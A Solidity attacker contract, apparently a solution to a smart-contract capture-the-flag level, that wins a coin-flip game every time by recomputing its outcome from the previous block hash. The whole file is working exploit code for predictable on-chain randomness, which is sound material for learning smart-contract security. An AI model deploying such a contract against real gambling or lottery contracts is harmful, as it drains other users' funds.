// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipper {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlip;
  address level = 0xb2e00dBAe7795f7b5219992de6539f203F4f226a;

  constructor() {
    coinFlip = CoinFlip(level);
  }

  function guess() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 newCoinFlip = blockValue / FACTOR;
    bool side = newCoinFlip == 1 ? true : false;

    return coinFlip.flip(side) == side;     
  }
}

abstract contract CoinFlip {
    function flip(bool _guess) external virtual returns (bool);
}